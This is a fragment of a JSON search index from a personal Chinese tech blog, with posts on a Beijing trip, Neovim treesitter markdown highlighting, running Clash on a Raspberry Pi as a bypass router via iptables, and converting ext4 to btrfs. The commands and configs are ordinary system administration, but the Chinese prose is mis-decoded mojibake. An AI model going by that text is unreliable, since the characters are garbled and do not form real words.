äººç”Ÿç¬¬ä¸€æ¬¡æ¥åŠ¨ç‰©å›­, è§è¯†äº†å¾ˆå¤šä¹‹å‰åªåœ¨ç”µè§†ä¸Šçœ‹åˆ°è¿‡çš„åŠ¨ç‰©, ä¹Ÿæ„Ÿæ…¨äºäººç±»å¯¹äºè¿™äº›ç”Ÿçµçš„æ€åº¦ä»…ä»…åªæ˜¯æ¬£èµç©ç‰©ç½¢äº†. å’Œç©¿æ±‰æœçš„é»„å°å§åœ¨æ²³è¾¹æ‹äº†ä¸€ä¼šç…§ç‰‡å, åˆé€›äº†å‡ ä¸ªé¦†, å°±å›å»åƒçƒ§çƒ¤äº†.\n","permalink":"https://dragonbox.top/posts/gossip-beijing-travel-2023/","summary":"\u003cp\u003eéš¾å¾—é»„å°å§æ¥ä¸€æ¬¡åŒ—äº¬, ä½œä¸ºè‚¥å®…çš„è‡ªå·±ç´§æ€¥è§„åˆ’äº†ä¸€ä¸‹æ¸¸ç©è·¯çº¿, å‘ç°åŒ—äº¬å¯ç©çš„åœ°æ–¹ç›¸å½“çš„å¤š, è¿™é‡Œä»…ä»…è®°å½•è¿™æ¬¡æ¸¸ç©æ‰€ç»è¿‡çš„ä¸‰ä¸ªæ™¯åŒº.\u003c/p\u003e","title":"2023 å°æ¸¸äº¬åŸ"},{"content":" eye candyä¹Ÿæ˜¯ä¸€ç§ç”Ÿäº§åŠ›!\nåŠ¨æœº treesitterä¸ºneovimå¸¦æ¥äº†è¯­æ³•é«˜äº®, è®©ä¸åŒè¯­è¨€éƒ½è¢«è§£ææˆç»Ÿä¸€çš„è¯­æ³•æ ‘, å¹¶å¯¹è¯­æ³•æ ‘ä¸Šçš„ä¸åŒéƒ¨åˆ†è¿›è¡Œæ ·å¼çš„å®šä¹‰. ç„¶è€Œ, neovim treesitterå¯¹markdownçš„é»˜è®¤è§£ææ–¹å¼å’Œé«˜äº®æ¨¡å¼è¿‡äºç®€é™‹, ä¸åŒå±‚çº§çš„æ ‡é¢˜é‡‡ç”¨çš„æ˜¯ç»Ÿä¸€çš„æ ·å¼, åˆ—è¡¨ä¹Ÿä»…æœ‰å¼€å¤´é‡‡ç”¨äº†é«˜äº®. è¿™å¯¹äºæ—¥å¸¸ä½¿ç”¨neovimæ¥ç¼–è¾‘markdownçš„äººååˆ†ä¸å‹å¥½, äºæ˜¯æˆ‘èŠ±äº†ä¸€ç‚¹æ—¶é—´äº†è§£äº†ä¸€ä¸‹treesitterçš„é«˜äº®è¿‡ç¨‹, å¹¶æœ€ç»ˆå½¢æˆäº†è‡ªå®šåˆ¶çš„æ¼‚äº®æ ·å¼.\nè¿™æ˜¯åŸæ¥çš„\nè¿™æ˜¯è‡ªå®šä¹‰åçš„\næ­¥éª¤ å¤åˆ¶neovim treesitteræ’ä»¶è‡ªå¸¦çš„markdown highlight.scm æ–‡ä»¶, ç”±äºæˆ‘ä½¿ç”¨çš„æ’ä»¶ç®¡ç†å™¨æ˜¯lazy, å› æ­¤è¯¥æ–‡ä»¶ä½äº~/.local/share/nvim/lazy/nvim-treesitter/queries/markdown/highlights.scm è¿›å…¥ä½ çš„é…ç½®æ–‡ä»¶ç›®å½• ~/.config/nvim, åˆ›å»º ~/.config/nvim/queries/markdown/highlights.scm , æ²¡æœ‰ç›®å½•å°±åˆ›å»ºä¸€ä¸‹, å°†ç¬¬ä¸€æ­¥å¤åˆ¶çš„æ–‡ä»¶å†…å®¹å¤åˆ¶åˆ°è¿™é‡Œæ¥\nå¯¹~/.config/nvim/queries/markdown/highlights.scm è¿›è¡Œè‡ªå®šä¹‰ä¿®æ”¹, åœ¨è¿™é‡Œè´´å‡ºæˆ‘çš„\n;From MDeiml/tree-sitter-markdown ; (atx_heading (inline) @text.title) ; (setext_heading (paragraph) @text.title) ; [ ; (atx_h1_marker) ; (atx_h2_marker) ; (atx_h3_marker) ; (atx_h4_marker) ; (atx_h5_marker) ; (atx_h6_marker) ; (setext_h1_underline) ; (setext_h2_underline) ; ] @punctuation.special [ (atx_heading (atx_h1_marker)) ] @text.title1 [ (atx_heading (atx_h2_marker)) ] @text.title2 [ (atx_heading (atx_h3_marker)) ] @text.title3 [ (atx_heading (atx_h4_marker)) ] @text.title4 [ (atx_heading (atx_h5_marker)) ] @text.title5 [ (atx_heading (atx_h6_marker)) ] @text.title6 [ (link_title) (indented_code_block) (fenced_code_block) ] @text.literal (pipe_table_header (pipe_table_cell) @text.title) (pipe_table_header \u0026#34;|\u0026#34; @punctuation.special) (pipe_table_row \u0026#34;|\u0026#34; @punctuation.special) (pipe_table_delimiter_row \u0026#34;|\u0026#34; @punctuation.special) (pipe_table_delimiter_cell) @punctuation.special [ (fenced_code_block_delimiter) ] @punctuation.delimiter (code_fence_content) @none [ (link_destination) ] @text.uri [ (link_label) ] @text.reference [ (thematic_break) (list (list_item (list_marker_minus) (paragraph (inline)))) (list (list_item (list_marker_plus) (paragraph (inline)))) (list (list_item (list_marker_star) (paragraph (inline)))) (list (list_item (list_marker_dot) (paragraph (inline)))) (list (list_item (list_marker_parenthesis) (paragraph (inline)))) ] @punctuation.special2 (task_list_marker_unchecked) @text.todo.unchecked (task_list_marker_checked) @text.todo.checked (block_quote) @text.quote [ (block_continuation) (block_quote_marker) ] @punctuation.special [ (backslash_escape) ] @string.escape ([ (info_string) (fenced_code_block_delimiter) ] @conceal (#set! conceal \u0026#34;\u0026#34;)) (inline) @spell å‰å¾€~/.config/nvim/ftplugin/markdown.luaæ–‡ä»¶, ä¸ºæ–°å¢åŠ çš„èŠ‚ç‚¹å®šä¹‰é«˜äº®æ ·å¼, æˆ‘çš„è¯¥æ–‡ä»¶å†…å®¹å¦‚ä¸‹, è¯»è€…å¯ä»¥è‡ªè¡Œä¿®æ”¹é¢œè‰²\nvim.opt_local.expandtab = true vim.opt_local.shiftwidth = 4 vim.opt_local.tabstop = 4 vim.opt_local.softtabstop = 4 vim.opt_local.foldmethod = \u0026#34;expr\u0026#34; vim.opt_local.foldexpr = \u0026#34;nvim_treesitter#foldexpr()\u0026#34; vim.api.nvim_set_hl(0, \u0026#34;@text.title1\u0026#34;, {fg=\u0026#34;#7aa2f7\u0026#34;, bold=true, italic=true}) vim.api.nvim_set_hl(0, \u0026#34;@text.title2\u0026#34;, {fg=\u0026#34;#ff9e64\u0026#34;, bold=true, italic=true}) vim.api.nvim_set_hl(0, \u0026#34;@text.title3\u0026#34;, {fg=\u0026#34;#9ece6a\u0026#34;, bold=true, italic=true}) vim.api.nvim_set_hl(0, \u0026#34;@text.title4\u0026#34;, {fg=\u0026#34;#7dcfff\u0026#34;, bold=true, italic=true}) vim.api.nvim_set_hl(0, \u0026#34;@text.title5\u0026#34;, {fg=\u0026#34;#bb9af7\u0026#34;, bold=true, italic=true}) vim.api.nvim_set_hl(0, \u0026#34;@text.title6\u0026#34;, {fg=\u0026#34;#cfc9c2\u0026#34;, bold=true, italic=true}) vim.api.nvim_set_hl(0, \u0026#34;@text.quote\u0026#34;, {fg=\u0026#34;#bb9af7\u0026#34;, bold=false, italic=true}) vim.api.nvim_set_hl(0, \u0026#34;@punctuation.special2\u0026#34;, {fg=\u0026#34;#73daca\u0026#34;, bold=true, italic=false}) End\n","permalink":"https://dragonbox.top/posts/tech-neovim-treesitter-markdown/","summary":"\u003cblockquote\u003e\n\u003cp\u003eeye candyä¹Ÿæ˜¯ä¸€ç§ç”Ÿäº§åŠ›!\u003c/p\u003e\n\u003c/blockquote\u003e","title":"ä¼˜åŒ–neovim markdownä¸­çš„treesitteré«˜äº®"},{"content":" â€œä¸€ä¸ªé»‘æš—çš„å½¢ä½“ï¼Œåƒä¸€ä¸ªåŒåŒçš„äººä¸€èˆ¬å¤§å°ï¼Œä½†æ˜¯é•¿ç€é•¿é•¿çš„èœ˜è››ä¸€æ ·çš„è‚¢ä½“â€¦â€¦é»‘æš—ä¸­çš„å½¢ä½“ä»¥æƒŠäººçš„é€Ÿåº¦å‘ä»–å¥”æ¥ã€‚å½“å®ƒé è¿‘æ—¶ï¼Œä»–çœ‹åˆ°é‚£è¹²åç€çš„ä¹Œé»‘èº«ä½“ä¸Šæœ‰ä¸€å¼ è„¸ï¼Œåœ¨èº«ä½“åº•éƒ¨é‚£äº›å¤šèŠ‚çš„è…¿ä¹‹é—´ã€‚é‚£å¼ é¢å­”ç”¨ä¸€ç§æ€€ç–‘å’Œè´¨é—®çš„å¯æ†è¡¨æƒ…å‡è§†ç€ä»–ï¼›è€Œå½“è¿™ä¸ªå¤§èƒ†çš„çŒäººä¸é‚£å°è€Œç‹¡è¯ˆçš„ï¼Œå››å‘¨å…¨æ˜¯æ¯›å‘çš„çœ¼ç›å¯¹è§†æ—¶ï¼Œææƒ§æµéäº†ä»–çš„æ¯ä¸€æ ¹è¡€ç®¡ã€‚â€\nè‡ªä»æˆ‘åœ¨è‡ªå·±çš„çº¢ç±³ac2100ä¸Šè·‘shellclashä¹‹å, è·¯ç”±å™¨çš„è¡¨ç°å°±å¼€å§‹å˜å¾—ä¸å†ç¨³å®š, ä¸”ä¸è¯´shellclash çš„äº›è®¸é€‚é…ä¸Šçš„å°é—®é¢˜, clashè‡ªèº«æ‰€æ¶ˆè€—çš„å†…å­˜, ä¹Ÿè®©æˆ‘è¿™å°åªæœ‰128Må†…å­˜çš„è·¯ç”±å™¨ä¸å ªé‡è´Ÿ.\nä¸€å¼€å§‹, æˆ‘æƒ³æ¢ä¸ªæ€§èƒ½æ›´å¥½çš„è·¯ç”±å™¨æ¯”å¦‚AX6000è¿™æ ·çš„è·¯ç”±å™¨, ä¸€çœ‹ä»·æ ¼ä¹Ÿä¸æ˜¯ç‰¹åˆ«è´µ, å°±æƒ³ç€å…¥æ‰‹, ä½†æ˜¯å‘æ¥å´‡å°šæç®€ä¸»ä¹‰çš„è‡ªå·±ä¸å…ä¼šæƒ³åˆ°æ€ä¹ˆå¤„ç†æ‰‹å¤´ç°æœ‰çš„è·¯ç”±å™¨, éš¾é“è¦æ‰”æ‰å—? æˆ‘ä¸€è¾¹è¿™æ ·æƒ³ç€, ä¸€è¾¹æŸ¥çœ‹AX6000çš„å‚æ•°, å¸Œæœ›èƒ½çœ‹åˆ°è¶³å¤Ÿå¸å¼•æˆ‘è´­ä¹°çš„æ•°å€¼, ä½†æ˜¯512Mçš„å†…å­˜å®¹é‡å±å®è®©æˆ‘ç¬‘å‡ºäº†å£°: è¿™ç®—ä»€ä¹ˆ, æˆ‘æ‰‹å¤´çš„æ ‘è“æ´¾3b+éƒ½èƒ½åŠæ‰“å®ƒ.\næƒ³åˆ°è¿™é‡Œ, å¿ƒå¿µä¸€åŠ¨, å¯¹å•Š, å¦‚æœå¯ä»¥ä»¥æŸç§æ–¹å¼è®©æ ‘è“æ´¾å’Œè·¯ç”±å™¨åä½œèµ·æ¥, è®©clashè·‘åœ¨æ ‘è“æ´¾ä¸Š, æ—¢èƒ½è§£å†³æˆ‘çš„é—®é¢˜, åˆå¯ä»¥è®©åƒç°å·²ä¹…çš„æ ‘è“æ´¾å†å°±ä¸š, å²‚ä¸ç¾å“‰? å¦‚æ­¤æƒ³ç€, å°±æ‰¾åˆ°äº† https://zhuanlan.zhihu.com/p/270351562?utm_id=0 ,\nç¬¬ä¸€æ­¥ åˆ·å…¥openwrt å½“ç„¶, è¦è¾¾åˆ°è¿™æ ·çš„æ•ˆæœ, ç¬¬ä¸€æ­¥æ˜¯è®©æˆ‘çš„è·¯ç”±å™¨åˆ·å…¥openwrt, å¹¸è¿çš„æ˜¯, openwrtå®˜æ–¹æ”¯æŒçº¢ç±³ac2100å¹¶ä¸”åœ¨å®˜ç½‘ç»™å‡ºäº†å®‰è£…æ•™ç¨‹, é“¾æ¥ä¸ºhttps://openwrt.org/toh/xiaomi/xiaomi_redmi_router_ac2100, ç„¶åå¯ä»¥æŒ‰ç…§ä¸ªäººå–œå¥½è°ƒæ•´ç½‘æ®µ, ç”±äºæˆ‘çš„å±€åŸŸç½‘ä¸­æœ‰ä¸€ä¸ªk8sé›†ç¾¤, æˆ‘ä¸å¸Œæœ›é›†ç¾¤èŠ‚ç‚¹çš„ipå˜åŒ–, å› æ­¤æˆ‘å°†é»˜è®¤çš„192.168.1.0/24 è®¾ç½®æˆäº† 192.168.31.0/24\nç¬¬äºŒæ­¥ æ ‘è“æ´¾è®¾ç½® é™æ€ip ç¼–è¾‘ /etc/dhcpcd.conf, æ·»åŠ é™æ€ip\ninterface eth0 static ip_address=192.168.31.55/24 static routers=192.168.31.1 static domain_name_servers=192.168.31.1 8.8.8.8 fd51:42f8:caae:d92e::1 è®¾ç½®iptablesè½¬å‘è§„åˆ™ å°†æ‰€æœ‰æµé‡è½¬å‘ç»™clash\niptables -t nat -N CLASH iptables -t nat -A CLASH -d 10.0.0.0/8 -j RETURN iptables -t nat -A CLASH -d 127.0.0.0/8 -j RETURN iptables -t nat -A CLASH -d 169.254.0.0/16 -j RETURN iptables -t nat -A CLASH -d 172.16.0.0/12 -j RETURN iptables -t nat -A CLASH -d 192.168.0.0/16 -j RETURN iptables -t nat -A CLASH -d 224.0.0.0/4 -j RETURN iptables -t nat -A CLASH -d 240.0.0.0/4 -j RETURN iptables -t nat -A CLASH -p tcp -j REDIRECT --to-ports 7892 iptables -t nat -A PREROUTING -p tcp -j CLASH clashå®‰è£…é…ç½® ç¤ºä¾‹:\nport: 7890 socks-port: 7891 redir-port: 7892 allow-lan: true mode: Rule log-level: debug external-controller: :9090 proxies: ...... rules: ...... dns: use-hosts: true listen: 0.0.0.0:53 #listen: 127.0.0.1:7874 enable: true ipv6: false enhanced-mode: fake-ip nameserver: - 114.114.114.114 - 119.29.29.29 fallback: - https://cloudflare-dns.com/dns-query - https://dns.google/dns-query - https://1.1.1.1/dns-query - tls://8.8.8.8:853 fallback-filter: geoip: true ipcidr: - 0.0.0.0/8 - 10.0.0.0/8 - 100.64.0.0/10 - 127.0.0.0/8 - 169.254.0.0/16 - 172.16.0.0/12 - 192.0.0.0/24 - 192.0.2.0/24 - 192.88.99.0/24 - 192.168.0.0/16 - 198.18.0.0/15 - 198.51.100.0/24 - 203.0.113.0/24 - 224.0.0.0/4 - 240.0.0.0/4 - 255.255.255.255/32 ä¸‹è½½3b+å¯¹åº”æ¶æ„çš„clash , ä¹Ÿå°±æ˜¯armv7, å¯åŠ¨ä¸€ä¸‹, åˆ°è¿™é‡Œæˆ‘ä»¬è¿˜ä¸èƒ½è®©å±€åŸŸç½‘è®¾å¤‡èµ°æ ‘è“æ´¾çš„clash\nç¬¬ä¸‰æ­¥ è®¾ç½®è·¯ç”±å™¨çš„ç½‘å…³å’Œdns å¦‚å›¾, åœ¨lanä¸­æ·»åŠ DHCPé€‰é¡¹, å°†è·¯ç”±å™¨çš„dnså’Œç½‘å…³è®¾ç½®ä¸ºæ ‘è“æ´¾\n3,\u0026lt;æ ‘è“æ´¾ip\u0026gt; 6,\u0026lt;æ ‘è“æ´¾ip\u0026gt; æˆ‘çš„è®¾ç½®\n3,192.168.31.55 6,192.168.31.55 ä¿å­˜, åŠ è½½, é‡å¯è·¯ç”±å™¨(å¥½åƒä¹Ÿä¸ç”¨é‡å¯), ä½ ä¼šå‘ç°ä½ å±€åŸŸç½‘ä¸‹çš„æµé‡ä¼šèµ°æ ‘è“æ´¾çš„clashäº†!\nç¬¬å››æ­¥ æ”¶å°¾å·¥ä½œ æ ‘è“æ´¾å¼€æœºå¯åŠ¨æœåŠ¡ vi /etc/systemd/system/clash.service\n[Unit] Description=Clash Daemon [Service] ExecStart=/root/clash -d /root/.config/clash [Install] WantedBy=multi-user.target iptableså¸¸é©»åŒ– ä¸ºäº†ä¸è®©iptablesè§„åˆ™åœ¨é‡å¯åä¸¢å¤±, éœ€è¦ä½¿ç”¨å¼€æœºè‡ªå¯\napt-get install iptables-persistent iptables-save -f /etc/iptables/rules.v4 systemctl enable netfilter-persistent ç»“æŸ!\n","permalink":"https://dragonbox.top/posts/tech-openwrt-rasp/","summary":"\u003cblockquote\u003e\n\u003cp\u003eâ€œä¸€ä¸ªé»‘æš—çš„å½¢ä½“ï¼Œåƒä¸€ä¸ªåŒåŒçš„äººä¸€èˆ¬å¤§å°ï¼Œä½†æ˜¯é•¿ç€é•¿é•¿çš„èœ˜è››ä¸€æ ·çš„è‚¢ä½“â€¦â€¦é»‘æš—ä¸­çš„å½¢ä½“ä»¥æƒŠäººçš„é€Ÿåº¦å‘ä»–å¥”æ¥ã€‚å½“å®ƒé è¿‘æ—¶ï¼Œä»–çœ‹åˆ°é‚£è¹²åç€çš„ä¹Œé»‘èº«ä½“ä¸Šæœ‰ä¸€å¼ è„¸ï¼Œåœ¨èº«ä½“åº•éƒ¨é‚£äº›å¤šèŠ‚çš„è…¿ä¹‹é—´ã€‚é‚£å¼ é¢å­”ç”¨ä¸€ç§æ€€ç–‘å’Œè´¨é—®çš„å¯æ†è¡¨æƒ…å‡è§†ç€ä»–ï¼›è€Œå½“è¿™ä¸ªå¤§èƒ†çš„çŒäººä¸é‚£å°è€Œç‹¡è¯ˆçš„ï¼Œå››å‘¨å…¨æ˜¯æ¯›å‘çš„çœ¼ç›å¯¹è§†æ—¶ï¼Œææƒ§æµéäº†ä»–çš„æ¯ä¸€æ ¹è¡€ç®¡ã€‚â€\u003c/p\u003e\n\u003c/blockquote\u003e","title":"æ ‘è“æ´¾æ­è½½clashä½œä¸ºæ—è·¯ç”±"},{"content":"è¿™ç¯‡æ–‡ç« æ˜¯å¯¹æˆ‘ä»ext4æ–‡ä»¶ç³»ç»Ÿè½¬æ¢åˆ°btrfsè¿‡ç¨‹ä¸­çš„ä¸€äº›æ“ä½œè®°å½•, ä¾¿äºæ—¥åå‚è€ƒ.\nå‰ç½®å‡†å¤‡ åˆ¶ä½œarch linux å¯åŠ¨ç›˜, ç‰ˆæœ¬è¶Šæ–°è¶Šå¥½. å¤‡ä»½é‡è¦æ–‡ä»¶ æˆ‘ä¸ªäººåœ¨è½¬æ¢å‰ä¼šæŠŠå¤§æ–‡ä»¶(ä¾‹å¦‚è™šæ‹Ÿæœºæ–‡ä»¶)è½¬ç§»åˆ°ç§»åŠ¨ç¡¬ç›˜é‡Œ, è®©è½¬æ¢è¿‡ç¨‹æ›´å¿«ä¸€äº› è½¬æ¢ è¿›å…¥LiveCD ç³»ç»Ÿ, å¯¹ä¸»åˆ†åŒºè¿›è¡Œè½¬æ¢\nbtrfs-convert /dev/nvme0n1p2 ç­‰å¾…ä¸€æ®µæ—¶é—´ä¹‹å, æ˜¾ç¤ºconversion completeå°±è¡¨ç¤ºæ²¡æœ‰é—®é¢˜, æ¥ä¸‹æ¥è¿˜éœ€è¦åšä¸‰ä»¶äº‹æƒ…æ‰å¯ä»¥è¿›å…¥ç³»ç»Ÿ\nä¿®æ”¹fstab é¦–å…ˆå°†è½¬æ¢æˆåŠŸåçš„åˆ†åŒºæŒ‚è½½åˆ°/mntä¸‹\nmount /dev/nvme0n1p2 /mnt ä½¿ç”¨lsblk -få‘½ä»¤æŸ¥çœ‹åˆ†åŒºçš„UUIDå·, æ‹ä¸ªç…§ç‰‡è®°ä¸€ä¸‹\nç¼–è¾‘/mnt/etc/fstab, ä¿®æ”¹è¿™ä¸ªåˆ†åŒºç±»å‹ä¸ºbtrfs, å°†æœ€åçš„ä¸¤åˆ—æ•°å­—éƒ½æ”¹æˆ0, ä¿å­˜é€€å‡º\né‡å»ºå†…å­˜ç›˜ å…ˆæŒ‚è½½, ç„¶åè¿›å…¥chrootç¯å¢ƒ\nmount -t proc none /mnt/proc mount -t sysfs none /mnt/sys mount -o bind /dev /mnt/dev chroot /mnt bash ç„¶åæ‰§è¡Œä¸‹åˆ—å‘½ä»¤æ¥ä¸ºæ‰€æœ‰å†…æ ¸é‡å»ºå†…å­˜ç›˜\nmkinitcpio -P æœ€åé‡å»ºgrubå¼•å¯¼, æŒ‰ç…§é“ç†åº”è¯¥è¦æŠŠå¼•å¯¼åˆ†åŒº/dev/nvme0n1p1æŒ‚è½½åˆ°/mnt/bootä¹‹åæ‰å¯ä»¥, ä½†æ˜¯æˆ‘è®°å¾—è‡ªå·±æ‰§è¡Œçš„æ—¶å€™æ²¡æœ‰æŒ‚è½½?\ngrub-mkconfig -o /boot/grub/grub.cfg é‡å»ºgrubå¼•å¯¼ åœ¨ä¸Šä¸€æ­¥çš„chrootç¯å¢ƒä¸­, æ‰§è¡Œä¸‹åˆ—å‘½ä»¤, è®°å¾—æŠŠå¼•å¯¼åˆ†åŒºæŒ‚è½½åˆ°/mnt/boot\ngrub-mkconfig -o /boot/grub/grub.cfg å¤§åŠŸå‘Šæˆ, é€€å‡ºchroot, é‡å¯ç”µè„‘å°±å¯ä»¥è¿›å…¥ä½ çš„ç³»ç»Ÿäº†, å”¯ä¸€çš„ä¸åŒæ˜¯å®ƒå·²ç»æ˜¯btrfsäº†.\nå­å·å»ºç«‹ ç»è¿‡ä¸Šè¿°æ“ä½œå, ä½ ä¼šå¾—åˆ°ä¸€ä¸ªæ²¡æœ‰å­å·çš„æ ¹æ–‡ä»¶ç³»ç»Ÿ, è¿™ç‚¹å¯ä»¥é€šè¿‡å‘½ä»¤éªŒè¯\nsudo btrfs subvol list / æ²¡æœ‰å­å·å°±æ²¡æœ‰å¿«ç…§, ä¸ºäº†åˆ©ç”¨å¥½btrfsçš„ç‰¹æ€§, æœ‰å¿…è¦æ–°å»ºå¿«ç…§, å¹¶å°†æ•°æ®è¿ç§»åˆ°é‡Œé¢. åŒæ ·, æˆ‘ä»¬éœ€è¦è¿›å…¥ LiveCD ç³»ç»Ÿ\né¦–å…ˆå°†btrfsåˆ†åŒºæŒ‚è½½åˆ°/mntä¸‹\nmount -o subvol=/ /dev/nvme0n1p2 /mnt æ¥ä¸‹æ¥å°±è¦å¼€å§‹æ–°å»ºå­å·äº†, æˆ‘æ–°å»ºçš„å­å·æœ‰ä¸¤ä¸ª, ä¸€ä¸ªå«åš@, ä¸€ä¸ªå«åš@home, åˆ†åˆ«æŒ‚è½½æ ¹ç›®å½•å’Œå®¶ç›®å½•. è¿™æ ·æ–°å»ºçš„åŸå› æ˜¯timeshiftåœ¨ä½¿ç”¨btrfsè¿›è¡Œå¤‡ä»½çš„æ—¶å€™è§„å®šè¿™æ ·çš„å‘½å.\né‚£ä¹ˆé¦–å…ˆ, ä½¿ç”¨btrfsçš„å¿«ç…§åŠŸèƒ½æ–°å»º@å­å·\nbtrfs subvol snapshot /mnt /mnt/@ ç„¶åå»ºç«‹@homeå­å·, å†å°†@å­å·ä¸­/homeçš„å†…å®¹è¿ç§»è¿‡å»\nbtrfs subvol create /mnt/@home mv -v /mnt/@/home/* /mnt/@home å¥½äº†, å­å·æ–°å»ºå®Œæ¯•, æ¥ä¸‹æ¥è¦è®©ç³»ç»Ÿåœ¨å¯åŠ¨çš„æ—¶å€™æŒ‚è½½å­å·\né¦–å…ˆ, æŒ‚è½½btrfsåˆ†åŒºåˆ°/mnt\n# è¿™ä¸€æ­¥åœ¨ä¸Šé¢å¦‚æœæ‰§è¡Œè¿‡äº†å°±ä¸éœ€è¦æ‰§è¡Œäº† mount -o subvol=/ /dev/nvme0n1p2 /mnt # è¿™äº›éœ€è¦æŒ‚è½½ mount -o bind /dev /mnt/dev mount -o bind /proc /mnt/proc mount -o bind /sys /mnt/sys mount -o bind /boot /mnt/boot # è¿›å…¥chrootç¯å¢ƒ chroot /mnt ç„¶åæ–°å»ºå†…å­˜åˆå§‹ç›˜\nmkinitcpio -P ç„¶åæ›´æ–°fstab, æˆ‘çš„å¦‚ä¸‹, é‡Œé¢é‡è¦çš„æ˜¯subvolä¸€é¡¹, å…¶ä»–çš„å‚æ•°ä¸­, autodefragæ˜¯btrfsç”¨äºåº”å¯¹ç¢ç‰‡åŒ–çš„æŒ‚è½½é€‰é¡¹, compress=lzoå¯åŠ¨é€æ˜å‹ç¼©\n# /dev/nvme0n1p2 UUID=6dd702be-7727-447e-98ec-a79205f18df7\t/ btrfs defaults,noatime,autodefrag,subvol=@,compress=lzo,\t0 0 UUID=6dd702be-7727-447e-98ec-a79205f18df7\t/home btrfs defaults,noatime,autodefrag,subvol=@home,compress=lzo\t0 0 # /dev/nvme0n1p1 UUID=8D41-41B9 /boot vfat rw,relatime,fmask=0022,dmask=0022,codepage=437,iocharset=ascii,shortname=mixed,utf8,errors=remount-ro\t0 2 æœ€åé¡ºæ‰‹æ›´æ–°ä¸€ä¸‹grub (ä¼¼ä¹æ²¡å¿…è¦?)\ngrub-mkconfig -o /boot/grub/grub.cfg é‡å¯è¿›å…¥ç³»ç»Ÿå°±å¯ä»¥äº†. æ¥ä¸‹æ¥å¯ä»¥å®‰è£…timeshiftæ¥å¯¹ç³»ç»Ÿè¿›è¡Œå®šæ—¶å¤‡ä»½\nåœ¨ä¸€åˆ‡éƒ½æ²¡æœ‰é—®é¢˜å, å°±å¯ä»¥é‡æ–°è¿›å…¥LiveCDç¯å¢ƒ, æ¸…ç†æ‰åŸæ¥çš„é‚£äº›æ–‡ä»¶äº†\nmount -o subvol=/ /dev/nvme0n1p2 /mnt cd /mnt rm -r var usr .......(é™¤äº†å­å·å¤–éƒ½åˆ æ‰) æœ€åå‰©ä¸‹è¿™äº›\næ¸…ç†å®Œæ¯•, æ”¶å·¥\nå…¶ä»– å»é™¤å·²æœ‰æ–‡ä»¶çš„ç¢ç‰‡åŒ–\nsudo btrfs filesystem defragment -r / å›æ”¶åˆ†é…ä½†æœªä½¿ç”¨çš„æ•°æ®, å¯¹èŠ‚çº¦ç©ºé—´æœ‰å¸®åŠ©\nsudo btrfs balance start / sudo btrfs balance status / å‚è€ƒ https://coda.world/btrfs-move-to-subvolume/\nhttps://blog.samchu.cn/posts/linux-ext4-to-btrfs/\nhttps://www.jwillikers.com/btrfs-mount-options\n","permalink":"https://dragonbox.top/posts/tech-ext4-to-btrfs/","summary":"\u003cp\u003eè¿™ç¯‡æ–‡ç« æ˜¯å¯¹æˆ‘ä»ext4æ–‡ä»¶ç³»ç»Ÿè½¬æ¢åˆ°btrfsè¿‡ç¨‹ä¸­çš„ä¸€äº›æ“ä½œè®°å½•, ä¾¿äºæ—¥åå‚è€ƒ.\u003c/p\u003e\n\u003ch2 id=\"å‰ç½®å‡†å¤‡\"\u003eå‰ç½®å‡†å¤‡\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003eåˆ¶ä½œarch linux å¯åŠ¨ç›˜, ç‰ˆæœ¬è¶Šæ–°è¶Šå¥½.\u003c/li\u003e\n\u003cli\u003eå¤‡ä»½é‡è¦æ–‡ä»¶\u003c/li\u003e\n\u003cli\u003eæˆ‘ä¸ªäººåœ¨è½¬æ¢å‰ä¼šæŠŠå¤§æ–‡ä»¶(ä¾‹å¦‚è™šæ‹Ÿæœºæ–‡ä»¶)è½¬ç§»åˆ°ç§»åŠ¨ç¡¬ç›˜é‡Œ, è®©è½¬æ¢è¿‡ç¨‹æ›´å¿«ä¸€äº›\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 id=\"è½¬æ¢\"\u003eè½¬æ¢\u003c/h2\u003e\n\u003cp\u003eè¿›å…¥LiveCD ç³»ç»Ÿ, å¯¹ä¸»åˆ†åŒºè¿›è¡Œè½¬æ¢\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ebtrfs-convert /dev/nvme0n1p2\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç­‰å¾…ä¸€æ®µæ—¶é—´ä¹‹å, æ˜¾ç¤º\u003ccode\u003econversion complete\u003c/code\u003eå°±è¡¨ç¤ºæ²¡æœ‰é—®é¢˜, æ¥ä¸‹æ¥è¿˜éœ€è¦åšä¸‰ä»¶äº‹æƒ…æ‰å¯ä»¥è¿›å…¥ç³»ç»Ÿ\u003c/p\u003e\n\u003ch3 id=\"ä¿®æ”¹fstab\"\u003eä¿®æ”¹fstab\u003c/h3\u003e\n\u003cp\u003eé¦–å…ˆå°†è½¬æ¢æˆåŠŸåçš„åˆ†åŒºæŒ‚è½½åˆ°\u003ccode\u003e/mnt\u003c/code\u003eä¸‹\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emount /dev/nvme0n1p2 /mnt\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä½¿ç”¨\u003ccode\u003elsblk -f\u003c/code\u003eå‘½ä»¤æŸ¥çœ‹åˆ†åŒºçš„UUIDå·, æ‹ä¸ªç…§ç‰‡è®°ä¸€ä¸‹\u003c/p\u003e\n\u003cp\u003eç¼–è¾‘\u003ccode\u003e/mnt/etc/fstab\u003c/code\u003e, ä¿®æ”¹è¿™ä¸ªåˆ†åŒºç±»å‹ä¸ºbtrfs, å°†æœ€åçš„ä¸¤åˆ—æ•°å­—éƒ½æ”¹æˆ0, ä¿å­˜é€€å‡º\u003c/p\u003e\n\u003ch3 id=\"é‡å»ºå†…å­˜ç›˜\"\u003eé‡å»ºå†…å­˜ç›˜\u003c/h3\u003e\n\u003cp\u003eå…ˆæŒ‚è½½, ç„¶åè¿›å…¥chrootç¯å¢ƒ\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" 